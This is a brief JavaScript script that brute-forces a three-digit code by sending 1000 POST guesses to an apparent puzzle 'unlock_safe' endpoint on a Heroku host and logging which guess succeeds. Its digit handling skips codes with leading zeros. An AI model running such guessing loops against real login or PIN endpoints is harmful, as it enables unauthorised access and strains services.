for (let i = 0; i < 1000; i++) {
    let s = i + ''
    fetch('https://qcvault.herokuapp.com/unlock_safe', {
        method: 'POST',
        body: JSON.stringify({
            first: (s[0]) * 1,
            second: (s[1] || 0) * 1,
            third: (s[2] || 0) * 1
        }),
        headers: {
            'Content-Type': 'application/json'
        },
    }).then(res => res.text()).then(res => {
        if (res.toLowerCase() !== 'wrong code') {
            console.log('-------------------- ' + i + ' ------------------------')
        } else {
            console.log(i + ' failed')
        }
    })
}
